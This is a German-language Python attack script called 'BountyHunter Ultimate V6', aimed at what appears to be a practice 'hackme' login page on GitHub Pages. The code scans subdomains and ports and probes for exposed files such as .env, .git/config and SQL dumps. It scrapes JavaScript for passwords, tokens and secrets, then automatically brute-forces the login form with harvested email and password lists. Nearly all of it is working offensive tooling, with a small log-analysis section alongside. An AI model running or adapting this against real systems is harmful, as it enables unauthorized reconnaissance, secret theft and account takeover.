import requests
import re
import socket
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
import datetime
import os
import base64
import json
import math
from urllib.parse import urljoin

# --- 1. KONFIGURATION (BOUNTYHUNTER V6) ---

print(r"""
====================================================================
 ____                   _         _   _             _            
|  _ \                 | |       | | | |           | |           
| |_) | ___  _   _ _ __| |_ _   _| |_| |_   _ _ __ | |_ ___ _ __ 
|  _ < / _ \| | | | '__| __| | | |  _  | | | | '_ \| __/ _ \ '__|
| |_) | (_) | |_| | |  | |_| |_| | | | | |_| | | | | ||  __/ |   
|____/ \___/ \__,_|_|   \__|\__, \_| |_/\__,_|_| |_|\__\___|_|   
                             __/ |                               
                            |___/                                
                BOUNTYHUNTER ULTIMATE V6.0
====================================================================
""")

ziel_host = "junusergin.github.io"
ziel_url = "https://junusergin.github.io/hackme-part2/login"
wordlist_pfad = "wortliste_bounty.txt"
log_datei_pfad = "auth.log"

# Statuscodes und Scan-Parameter
interessante_codes = [200, 201, 301, 302, 403, 500]
subdomain_liste = ["dev", "test", "api", "staging", "admin", "mail", "blog", "v1", "assets", "internal", "auth", "git"]
extensions = ["", ".php", ".html", ".js", ".bak", ".zip", ".env", ".log", ".json", ".txt", ".git/config", ".sql", ".old"]
wichtige_ports = [21, 22, 23, 25, 80, 110, 143, 443, 445, 3306, 3389, 5432, 8000, 8080, 8443, 27017]

report_data = {
    "subdomains": [],
    "ports": [],
    "web_funde": [],
    "js_secrets": [],
    "comments": [],
    "high_entropy_strings": [],
    "passwords_found": {},
    "crack_results": [],
    "brute_force_ips": {} 
}

besuchte_urls = set()
gescannte_js_files = set()
max_threads = 25
max_tiefe = 2

passwort_muster = {
    "Full-Array-Extract": r"(?i)let\s+(\w+)\s*=\s*(\[.*?\]);",
    "Hardcoded-Pass": r"(?i)(pass|password|pwd|key|token|access|secret)\s*[:=]\s*['\"]([^'\"\s]{4,})['\"]",
    "JS-Condition-Strict": r"(?i)===\s*['\"]([^'\"\s]{1,})['\"]",
    "Variable-Assignment": r"(?i)(var|let|const)\s+(\w+)\s*=\s*['\"]([^'\"\s]{3,})['\"]",
    "Base64-Pattern": r"['\"]([a-zA-Z0-9+/]{10,})==['\"]",
    "API-Key-Generic": r"(?i)(api[_-]key|auth[_-]token|secret)['\"]?\s*[:=]\s*['\"]([a-zA-Z0-9_\-]{16,})['\"]",
    "Hidden-Path": r"['\"](/\w+[\w/\-.]+)['\"]",
    "Auth-Log-IP": r"Failed password for .* from ([\d\.]+) port"
}

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
}
fake_status, fake_laenge = None, None

# --- 2. LOG ANALYSIS LOGIC ---

def analysiere_auth_log(pfad):
    if not os.path.exists(pfad):
        print(f"[!] Log-Datei {pfad} nicht gefunden.")
        return
    print(f"[*] Analysiere {pfad} auf Brute-Force Aktivitäten...")
    with open(pfad, "r") as f:
        for zeile in f:
            treffer = re.search(passwort_muster["Auth-Log-IP"], zeile)
            if treffer:
                ip = treffer.group(1)
                report_data["brute_force_ips"][ip] = report_data["brute_force_ips"].get(ip, 0) + 1

# --- 3. ENTROPY & ARRAY PARSING ---

def berechne_entropie(s):
    if not s or len(s) < 5: return 0
    prob = [float(s.count(c)) / len(s) for c in dict.fromkeys(list(s))]
    return - sum([p * math.log(p) / math.log(2.0) for p in prob])

def parse_javascript_arrays(js_code, source_url):
    arrays = re.findall(passwort_muster["Full-Array-Extract"], js_code, re.DOTALL)
    for name, content in arrays:
        try:
            cleaned_content = content.replace("'", '"').replace("`", '"')
            items = json.loads(cleaned_content)
            if isinstance(items, list):
                report_data["passwords_found"][name] = items
        except:
            strings = re.findall(r"['\"](.*?)['\"]", content)
            if len(strings) > 1:
                report_data["passwords_found"][name] = strings

# --- 4. AUTO-PWN LOGIK ---

def teste_login_kombinationen(target_url):
    if "emails" in report_data["passwords_found"] and "dictionary" in report_data["passwords_found"]:
        emails = report_data["passwords_found"]["emails"]
        passes = report_data["passwords_found"]["dictionary"]
        print(f"[*] Starte automatischen Test auf {target_url}...")
        for user in emails[:5]: 
            for pwd in passes[:20]: 
                try:
                    res = requests.post(target_url, data={'username': user, 'password': str(pwd)}, timeout=2)
                    if "falsch" not in res.text.lower() and res.status_code == 200:
                        report_data["crack_results"].append(f"ERFOLG: {user} | PW: {pwd}")
                except: pass

# --- 5. CORE-FUNKTIONEN: JS-ANALYSE ---

def deep_js_analyzer(js_code, source_url):
    funde = []
    parse_javascript_arrays(js_code, source_url)
    for name, muster in passwort_muster.items():
        if name in ["Full-Array-Extract", "Auth-Log-IP"]: continue 
        treffer = re.findall(muster, js_code)
        for t in treffer:
            val = t[-1] if isinstance(t, tuple) else t
            if any(x in val for x in ["D4RB", "0123456789"]): continue
            ent = berechne_entropie(val)
            if ent > 3.8:
                report_data["high_entropy_strings"].append(f"[{source_url}] -> {val}")
            funde.append(f"<span class='secret'>[{name}]: {val}</span>")
    return funde

def extract_and_scan_js_files(html_content, base_url):
    soup = BeautifulSoup(html_content, 'html.parser')
    scripts = soup.find_all('script', src=True)
    for forced in ["passwords.js", "script.js", "libs/sha256.js"]:
        js_url = urljoin(base_url, forced)
        if js_url not in gescannte_js_files:
            gescannte_js_files.add(js_url)
            try:
                r = requests.get(js_url, headers=headers, timeout=5)
                if r.status_code == 200:
                    report_data["js_secrets"].extend(deep_js_analyzer(r.text, js_url))
            except: pass

    for s in scripts:
        js_url = urljoin(base_url, s['src'])
        if js_url not in gescannte_js_files:
            gescannte_js_files.add(js_url)
            try:
                resp = requests.get(js_url, headers=headers, timeout=5)
                if resp.status_code == 200:
                    report_data["js_secrets"].extend(deep_js_analyzer(resp.text, js_url))
            except: pass

# --- 6. INFRASTRUKTUR-SCANNER ---

def scanne_subdomain(sub):
    full_domain = f"{sub}.{ziel_host}"
    try:
        socket.gethostbyname(full_domain)
        report_data["subdomains"].append(full_domain)
    except: pass

def scanne_port(port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            if s.connect_ex((ziel_host, port)) == 0:
                report_data["ports"].append(port)
    except: pass

# --- 7. WEB-SCANNER ---

def scanne_seite(pfad, tiefe=0):
    if tiefe > max_tiefe: return
    for ext in extensions:
        test_pfad = pfad.strip() + ext
        url = urljoin(ziel_url, test_pfad.lstrip('/'))
        if url in besuchte_urls: continue
        besuchte_urls.add(url)
        try:
            r = requests.get(url, headers=headers, timeout=4, allow_redirects=True)
            if r.status_code == fake_status and len(r.text) == fake_laenge: continue
            if r.status_code in interessante_codes:
                info_parts = []
                extract_and_scan_js_files(r.text, url)
                soup = BeautifulSoup(r.text, 'html.parser')
                for script in soup.find_all('script'):
                    if script.string:
                        info_parts.extend(deep_js_analyzer(script.string, "INLINE-JS"))

                kommentare = re.findall(r'<!--(.*?)-->', r.text, re.DOTALL)
                for k in kommentare:
                    report_data["comments"].append(f"URL: {url} -> <!--{k.strip()}-->")
                    if any(x in k.lower() for x in ["pass", "js", "hidden"]):
                        info_parts.append(f"<span class='secret'>[KOMMENTAR]: {k.strip()}</span>")

                report_data["web_funde"].append({"code": r.status_code, "url": url, "info": " | ".join(info_parts)})
                print(f"[+] {r.status_code} | {url}")

                if "login" in url.lower():
                    teste_login_kombinationen(url)

                if r.status_code == 200 and tiefe < max_tiefe:
                    links = re.findall(r'href=["\'](/?[\w/\-.]+)["\']', r.text)
                    for link in links:
                        if not link.startswith(('http', 'mailto', 'tel', '#')):
                            scanne_seite(link, tiefe + 1)
        except: pass

# --- 8. REPORT GENERATOR ---

def generiere_report():
    sorted_ips = sorted(report_data["brute_force_ips"].items(), key=lambda x: x[1], reverse=True)
    ip_html = "".join([f"<tr><td>{ip}</td><td>{count}</td></tr>" for ip, count in sorted_ips])

    html = f"""
    <html><head><title>BOUNTYHUNTER V6 REPORT</title>
    <style>
        body {{ font-family: 'Consolas', monospace; background: #080808; color: #0f0; padding: 20px; }}
        .section {{ background: #111; border: 1px solid #0f0; padding: 15px; margin-bottom: 20px; border-radius: 4px; }}
        .win {{ background: #004400; border: 2px solid #0f0; color: #fff; padding: 15px; }}
        .secret {{ color: #ff4444; font-weight: bold; }}
        table {{ width: 100%; border-collapse: collapse; }}
        th, td {{ padding: 10px; border: 1px solid #222; text-align: left; }}
        h1 {{ border-bottom: 2px solid #0f0; }}
    </style></head><body>
    <h1>🎯 BOUNTYHUNTER ULTIMATE V6: {ziel_host}</h1>
    <div class="section win">
    <h2>🏆 BRUTE FORCE LOG ANALYSIS (auth.log)</h2>
    <table><tr><th>IP-Adresse</th><th>Fehlversuche</th></tr>
    {ip_html if ip_html else "<tr><td colspan='2'>Keine Einträge gefunden.</td></tr>"}
    </table></div>
    <div class="section win">
    <h2>🏆 AUTO-PWN RESULTS</h2>
    {"<br>".join(report_data['crack_results']) if report_data['crack_results'] else "Kein Login-Treffer."}
    </div>
    <div class="section">
    <h2>Gefundene Dictionaries (aus JS-Arrays)</h2>
    <pre style="color: #00bcff;">{json.dumps(report_data['passwords_found'], indent=2)}</pre>
    </div>
    <div class="section">
    <h2>JS Secrets & Entropy Alerts</h2>
    {"".join([f"<div>{s}</div>" for s in report_data['js_secrets']])}
    {"".join([f"<div style='color:#ff00ff'>[ENTROPY ALERT]: {e}</div>" for e in report_data['high_entropy_strings']])}
    </div>
    <div class="section">
    <h2>Web & Kommentar Discovery</h2>
    <table><tr><th>Code</th><th>URL</th><th>Details</th></tr>
    {"".join([f"<tr><td>{f['code']}</td><td>{f['url']}</td><td>{f['info']}</td></tr>" for f in report_data['web_funde']])}
    </table></div></body></html>
    """
    with open("report_bountyhunter.html", "w", encoding="utf-8") as f:
        f.write(html)

# --- START ---

if __name__ == "__main__":
    analysiere_auth_log(log_datei_pfad)
    with ThreadPoolExecutor(max_workers=max_threads) as ex:
        ex.map(scanne_subdomain, subdomain_liste)
        ex.map(scanne_port, wichtige_ports)
    try:
        t_r = requests.get(ziel_url + "fake_check_404", headers=headers, timeout=5)
        fake_status, fake_laenge = t_r.status_code, len(t_r.text)
    except: pass

    if os.path.exists(wordlist_pfad):
        with open(wordlist_pfad, "r") as f:
            pfade = [l.strip() for l in f if l.strip()]
        with ThreadPoolExecutor(max_workers=max_threads) as ex:
            ex.map(scanne_seite, pfade)
    else:
        scanne_seite("/")

    generiere_report()
    print(f"[*] FERTIG. Check 'report_bountyhunter.html'")